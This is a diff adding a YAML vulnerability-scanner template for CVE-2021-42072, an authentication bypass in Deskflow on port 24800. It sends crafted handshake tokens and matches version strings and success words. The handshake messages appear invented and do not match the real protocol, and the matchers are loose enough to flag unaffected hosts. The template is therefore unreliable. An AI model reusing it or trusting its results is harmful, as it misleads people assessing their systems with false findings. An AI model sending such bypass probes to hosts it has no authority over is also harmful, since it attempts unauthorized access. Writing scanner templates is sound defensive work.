@@ -1,0 +1,70 @@
+id: cve-2021-42072-deskflow
+info:
+  name: "Deskflow Client Verification Vulnerability"
+  author: Denizhan Dakılır
+  severity: high
+  description: |
+    This checks if a critical security vulnerability exists in Deskflow.
+    The server component fails to properly verify client identities during the
+    connection handshake process. An attacker can bypass client verification by
+    providing crafted verification tokens, potentially leading to unauthorized
+    access and remote code execution.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-42072
+    - https://github.com/debauchee/barrier/releases/tag/v2.4.0
+    - http://www.openwall.com/lists/oss-security/2021/11/02/4
+  tags: cve,CVE-2021-42072,deskflow,auth-bypass,rce
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2021-42072
+
+network:
+  - inputs:
+      - data: |
+          CONNECT:{{randstr_1024}}
+          VERIFY:INVALID_TOKEN_{{randstr_1024}}
+          CLIENT:test_client
+      - data: |
+          CONNECT:{{base64("admin")}}
+          VERIFY:{{base64("admin_token")}}
+          CLIENT:admin
+      - data: |
+          CONNECT:{{hex_encode("system")}}
+          VERIFY:{{hex_encode("system_token")}}
+          CLIENT:system
+    host:
+      - "tls://{{Hostname}}"
+    port: 24800
+    read-size: 1024
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: response
+        regex:
+          - 'Deskflow v[0-1]\.[0-7]\.[0-9]+'
+          - 'Deskflow v1\.[0-7]\.[0-9]+'
+          - 'Deskflow Server v[0-1]\.[0-7]\.[0-9]+'
+          - 'Deskflow Server v1\.[0-7]\.[0-9]+'
+        condition: or
+      - type: word
+        part: response
+        words:
+          - "ACCEPTED"
+          - "SUCCESS"
+          - "VERIFIED"
+          - "CONNECTED"
+          - "\x00\x01CONNECTED"
+          - "\x00\x01VERIFIED"
+        condition: or
+      - type: dsl
+        condition: or
+        dsl:
+          - '!contains(response, "INVALID") && !contains(response, "ERROR")'
+          - '!contains(response, "AUTH_FAILED") && !contains(response, "REJECTED")'
+    extractors:
+      - type: regex
+        part: response
+        regex:
+          - "DESKFLOW:([0-9.]+)"
+        group: 1
